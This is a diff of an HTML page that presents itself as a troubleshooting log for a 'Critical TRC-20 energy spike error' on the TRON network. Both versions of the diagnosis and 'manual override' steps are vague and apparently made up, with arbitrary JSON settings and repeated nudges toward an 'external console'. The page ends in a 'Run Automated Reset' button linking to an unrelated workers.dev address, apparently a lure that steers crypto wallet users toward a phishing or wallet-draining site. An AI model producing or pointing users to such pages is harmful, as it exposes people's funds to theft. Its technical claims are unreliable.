@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #1a1a24;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,34 @@
 <h1>Critical Trc 20 Energy Spike Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a sudden and significant increase in energy consumption when attempting to transfer TRC-20 tokens on the TRON network, resulting in transaction failures and error messages indicating a "Critical TRC-20 energy spike error".</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message when attempting to transfer TRC-20 tokens on the TRON network, resulting in failed transactions and potential loss of funds.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an imbalance in the network's energy market, where the demand for energy exceeds the available supply, causing a spike in energy prices and leading to transaction failures.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by smart contracts, exceeding the maximum allowed energy limit per block, thereby causing transactions to fail.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To mitigate the issue, users can attempt the following manual overrides:</li>
-<li>Adjust the transaction's energy limit to a higher value to account for the increased energy prices</li>
-<li>Use a different transaction path or route to avoid congested areas of the network</li>
-<li>Implement a custom energy management script, such as:
-  <code>json
-{
-  "energy_limit": 1000,
-  "energy_price": 1e-6
-}</code>
-Consider using an external console to execute these commands for more flexibility. 
-Prerequisites:</li>
-<li>A basic understanding of TRON's energy market mechanics</li>
-<li>Access to a TRON wallet or transaction interface</li>
-<li>Familiarity with JSON scripting language</li>
+<li>Adjust the energy limit per block using the <code>--energy.limit</code> flag when running the TRON node.</li>
+<li>Implement a custom energy management system to dynamically adjust energy allocation based on network conditions.</li>
+<li>Utilize the following JSON configuration to override default energy settings:</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li></ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;energy&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;threshold&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">0.8</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more advanced debugging and configuration options. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>A thorough understanding of TRON network architecture and smart contract execution</li>
+<li>Familiarity with TRON node configuration and energy management</li>
+<li>Access to the TRON node's configuration files and command-line interface</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
